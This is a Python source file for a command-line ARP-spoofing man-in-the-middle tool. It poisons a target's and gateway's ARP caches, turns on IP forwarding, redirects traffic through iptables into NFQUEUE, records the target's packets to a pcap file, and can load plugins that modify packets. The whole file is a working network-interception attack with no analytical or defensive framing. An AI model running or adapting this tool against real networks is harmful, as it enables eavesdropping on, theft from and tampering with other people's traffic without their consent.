#!/usr/bin/python2
from __future__ import print_function
import importlib
import os
import threading
import sys
import argparse
from netfilterqueue import NetfilterQueue
from scapy.all import *

from arp_attacker import ARP_attacker

parser = argparse.ArgumentParser(description='MiTM tool', usage='./mitm -i <interface> -t <target_ip> -g <gateway_ip>')
parser.add_argument('-i', '--interface', type=str, help='Interface to perform the attack on')
parser.add_argument('-t', '--target', type=str, help='Target IP to attack')
parser.add_argument('-g', '--gateway', type=str, help='Gateway IP address')
parser.add_argument('-o', '--output', type=str, help='Capture file name', default='capture.pcap')
parser.add_argument('-p', '--plugin', type=str, help='Load a plugin')

args = parser.parse_args()

if args.interface is None or args.target is None or args.gateway is None:
    parser.print_help()
    sys.exit(0)

def save_packet(packet):
    global packets, callback, target_ip

    pkt = IP(packet.get_payload())

    if pkt[IP].src == target_ip or pkt[IP].dst == target_ip:
        packets.append(pkt)
        callback(packet)
    else:
        packet.accept()


if args.plugin is not None:
    plugin = 'plugins.' + args.plugin
    callback = importlib.import_module(plugin).callback
else:
    def callback(packet):
        pkt = IP(packet.get_payload())
        print(pkt.summary())

        packet.accept()


interface       = args.interface
target_ip       = args.target
gateway_ip      = args.gateway

conf.iface      = interface
conf.verb       = 0
done            = False
filename        = args.output
packets         = PacketList()


if not args.output.endswith('.pcap'):
    filename += '.pcap'

arp = ARP_attacker(target_ip, gateway_ip)

if arp.target_mac is None:
    print('[-] Failed to get target MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Target {} is at {}'.format(arp.target_ip, arp.target_mac))

if arp.gateway_mac is None:
    print('[-] Failed to get gateway MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Gateway {} is at {}'.format(arp.gateway_ip, arp.gateway_mac))

print('[*] Enabling IP forwarding...')
os.system('sysctl -w net.ipv4.ip_forward=1')

print('[*] Setting up iptables...')
os.system('iptables -t mangle -I PREROUTING -j NFQUEUE --queue-num 1')

print('[*] Poisoning...')

poison_thread = threading.Thread(target=arp.poison)
poison_thread.start()

nfqueue = NetfilterQueue()
nfqueue.bind(1, save_packet)

try:
    print('[*] Starting MITM... Press CTRL-C to stop.')
    nfqueue.run()

except KeyboardInterrupt:
    print('\r', end='')
    print(packets)
    print('[*] Cleaning up...')

    wrpcap(filename, packets)

    arp.restore()
    nfqueue.unbind()
    os.system('sysctl -w net.ipv4.ip_forward=0')
    os.system('iptables -t mangle -F')

    print('[-] Exiting...')
